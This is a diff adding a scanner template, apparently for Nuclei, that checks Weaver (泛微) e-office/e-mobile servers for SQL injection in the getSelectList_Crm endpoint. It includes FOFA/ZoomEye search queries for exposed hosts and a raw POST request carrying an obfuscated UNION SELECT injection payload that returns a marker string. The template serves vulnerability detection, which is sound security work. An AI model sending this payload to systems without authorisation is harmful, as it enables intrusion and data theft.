@@ -1,0 +1,31 @@
+id: ecology-e-office-getselectlist-crm-sqli
+
+info:
+  name: 泛微e-office getSelectList_Crm SQL注入
+  author: SleepingBag945
+  severity: high
+  description: |-
+    FOFA: app="泛微-EOffice"
+    ZoomEye: app:"泛微移动办公平台e-mobile"
+  tags: ecology,sqli,e-mobile,e-office,e-cology
+
+
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/Init.php?m=getSelectList_Crm HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cc_parent_id=-999+%2F%2A%2150000union%2A%2F+%2F%2A%2150000all%2A%2F+%2F%2A%2150000select%2A%2F+1%2C%28%2F%2A%2150000select%2A%2F+0x4141423339413141%29%23
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "AAB39A1A"
+
+      - type: status
+        status:
+          - 200
